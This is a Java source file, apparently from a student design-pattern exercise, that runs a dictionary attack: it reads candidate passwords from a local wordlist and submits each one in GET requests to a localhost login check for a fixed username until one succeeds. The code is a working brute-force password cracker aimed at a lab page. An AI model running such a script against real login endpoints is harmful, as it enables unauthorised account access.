import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class Dictionary implements PasswCracker {
    @Override

    public String cracker (int size, int[] password, int position) throws InterruptedException  {

        System.out.println("************************* Dictionnary *************************");

        try {
            File file = new File("C:\\Users\\HalimaG\\Desktop\\DesignPattern_TP\\Factory\\dictionnaire.txt");
            Scanner scanner = new Scanner(file);

            String temp=null;

            while(scanner.hasNextLine()){
                temp=scanner.nextLine();
                if (HttpURLConnectionExample.sendGET(temp)){
                    System.out.print("Votre mot de passe est :"+temp+"\n Bye!");
                  //stop the thread
                    return temp;
                }
            }        


        } catch (Exception e) {
            System.out.print(e);
        }
        System.out.print("Mot de passe non retrouvé");
        return "Mot de passe non retrouvé";
    }
    

    class HttpURLConnectionExample {

        private static final String USER_AGENT = "Mozilla/5.0";
      
        private static final String GET_URL = "http://localhost/BruteForce/verification.php";
      
        private static final String username = "username=halima";
      
      
        public static boolean sendGET(String vPassword) throws IOException {
          String url=GET_URL+"?"+username+"&"+"password="+vPassword;
          
          URL obj = new URL(url);
          HttpURLConnection con = (HttpURLConnection) obj.openConnection();
          con.setRequestMethod("GET");
          con.setRequestProperty("User-Agent", USER_AGENT);
          int responseCode = con.getResponseCode();
      
      
          if (responseCode == 200) { //success
            System.out.println(url);
            return true;
          }
          else {
            return false;
        }
      
        }
    }

}
